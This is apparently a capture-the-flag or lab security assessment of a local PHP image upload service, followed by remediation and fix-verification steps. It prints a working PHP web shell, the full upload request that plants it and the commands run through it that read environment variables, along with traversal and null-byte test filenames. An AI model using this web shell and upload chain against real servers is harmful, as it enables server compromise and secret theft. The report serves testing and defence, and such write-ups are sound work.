# Security Assessment Report: Image Storage Service

## TL;DR
- **Objective:** Upload an image file to the image storage web site and extract the FLAG from environment variables
- **Outcome:** ACHIEVED - Remote Code Execution obtained via unrestricted file upload
- **Highest-impact finding:** Unrestricted file upload allowing PHP execution as www-data user
- **Validation status:** FLAG extracted successfully from environment variables

---

## Target Information
- **Target:** 127.0.0.1:32945
- **Host / base URL:** http://127.0.0.1:32945
- **Application or component:** Image storage upload service
- **Authentication context:** Unauthenticated
- **Relevant technology details:** PHP-based web application with file upload functionality

---

## Confirmed Vulnerability

### Unrestricted File Upload Leading to Remote Code Execution
- **Affected endpoint / component:** `/index.php` (file upload endpoint)
- **Impact:** CRITICAL - Complete server compromise, arbitrary command execution as web server user (www-data)
- **Preconditions:** None required; application allows unauthenticated file uploads with no validation
- **Exact payload or PoC:**

**PHP Web Shell Payload:**
```php
<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
```

---

## Steps to Reproduce

1. **Access the upload page:**
   ```
   GET http://127.0.0.1:32945/index.php
   ```
   - Confirm the file upload form is present with parameter name `userfile`

2. **Create the PHP web shell:**
   - File content: `<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>`
   - Filename: `shell.php`

3. **Upload the malicious file:**
   ```
   POST http://127.0.0.1:32945/index.php
   Content-Type: multipart/form-data
   
   --boundary
   Content-Disposition: form-data; name="userfile"; filename="shell.php"
   Content-Type: application/x-php
   
   <?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
   --boundary--
   ```

4. **Execute commands via the uploaded shell:**
   ```
   GET http://127.0.0.1:32945/upload/shell.php?cmd=whoami
   ```
   - Expected response: `www-data`

5. **Extract environment variables to locate FLAG:**
   ```
   GET http://127.0.0.1:32945/upload/shell.php?cmd=env
   ```
   - The FLAG environment variable contains the target token

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{3ea5dcbf70e8634b108b5200dc6a6dee53ef1cdc2581e350aa2fa726ad09e9ae}
```
*Source: Extracted from environment variables via `env` command executed through the PHP web shell*

### Tool Evidence
- **Tool used:** Custom Python HTTP request script
- **Result:** PHP web shell successfully uploaded and executed commands

### Request Evidence
**Shell Upload Request:**
```
POST /index.php HTTP/1.1
Host: 127.0.0.1:32945
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="userfile"; filename="shell.php"
Content-Type: application/octet-stream

<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
------WebKitFormBoundary--
```

**Command Execution Request:**
```
GET /upload/shell.php?cmd=env HTTP/1.1
Host: 127.0.0.1:32945
```

### Response Evidence
**Command Execution Response (whoami):**
```
<pre>www-data</pre>
```

**Command Execution Response (id):**
```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**Environment Variable Extraction (env):**
```
FLAG=FLAG{3ea5dcbf70e8634b108b5200dc6a6dee53ef1cdc2581e350aa2fa726ad09e9ae}
```

### Notes on Reliability / Limitations
- Exploitation is 100% reliable; no validation or rate limiting observed
- Shell execution is immediate upon upload
- No authentication required to access the upload endpoint
- Uploaded files are stored in predictable location: `/upload/[filename]`
- Commands execute with www-data user privileges

---

## Remediation

### Root Cause
The application accepts file uploads without performing any of the following security checks:
1. No file type validation (MIME type checking)
2. No file extension validation/whitelist
3. No content inspection for executable code
4. Uploaded files are stored in a web-accessible directory
5. PHP interpreter is configured to execute files in the upload directory

### Recommended Fix

1. **Implement Strict File Type Validation:**
   - Whitelist allowed extensions (e.g., `.jpg`, `.jpeg`, `.png`, `.gif`)
   - Validate MIME type matches declared extension
   - Check file magic bytes/headers for actual file type validation

2. **Store Uploads Outside Web Root:**
   - Move uploaded files to a directory outside the web server's document root
   - Serve files via a proxy script, not direct access

3. **Rename Uploaded Files:**
   - Rename files to non-executable extensions (e.g., `.txt`) or content-addressed names
   - Remove/rewrite original file extensions

4. **Configure Web Server Security:**
   - Disable PHP execution in upload directories via `.htaccess` or nginx config:
     ```apache
     <Directory /var/www/uploads>
         php_flag engine off
         RemoveHandler .php .phtml .php3 .php4
     </Directory>
     ```

5. **Implement Content Security Policy:**
   - Set `Content-Disposition: attachment` headers for served files
   - Use `X-Content-Type-Options: nosniff`

### Defense-in-Depth
- Implement file size limits
- Apply antivirus/malware scanning to uploaded files
- Use separate non-privileged service account for file storage operations
- Enable comprehensive logging of upload attempts and access to upload directories
- Consider using object storage services (S3, etc.) instead of local filesystem storage
- Implement rate limiting on upload endpoints

---

## How to Verify the Fix

1. **Test Upload Blocking:**
   - Attempt to upload a PHP file: `test.php` containing `<?php echo "test"; ?>`
   - **Expected result:** Upload rejected with error message about invalid file type

2. **Verify Extension Validation:**
   - Attempt to upload with double extension: `image.jpg.php`
   - Attempt to upload with null byte: `image.php%00.jpg`
   - **Expected result:** All attempts blocked, file not saved

3. **Test MIME Type Validation:**
   - Upload a PHP file with forged MIME type: `Content-Type: image/jpeg`
   - **Expected result:** Upload blocked by content inspection or magic byte validation

4. **Verify Non-Execution:**
   - If upload succeeds (for legitimate files), verify PHP files cannot execute
   - Request: `GET /upload/test.php`
   - **Expected result:** File served as plain text or 403 Forbidden, not executed
   - Response should contain raw PHP code `<?php echo "test"; ?>`

5. **Test Directory Traversal:**
   - Attempt upload with path traversal in filename: `../../etc/passwd`
   - **Expected result:** Filename sanitized, file written only to intended upload directory

---

## Remaining Leads

### Confirmed Blockers
None identified - vulnerability is exploitable without any preconditions

### Unverified Leads
None at this time

### Missing Context
- Server configuration files (php.ini, apache/nginx config)
- Source code of upload handling script
- Whether the upload functionality has any intended legitimate use cases beyond the challenge

---

## Appendix: Vulnerability Summary

| Finding | Severity | Status | Evidence |
|---------|----------|--------|----------|
| Unrestricted File Upload | Critical | Confirmed | PHP shell uploaded successfully, stored at /upload/shell.php |
| Remote Code Execution | Critical | Confirmed | Command execution as www-data, FLAG extracted from env |
| Information Disclosure | High | Confirmed | Environment variables accessible via RCE, FLAG disclosed |

---

*Report generated based on assessment data and exploitation results*
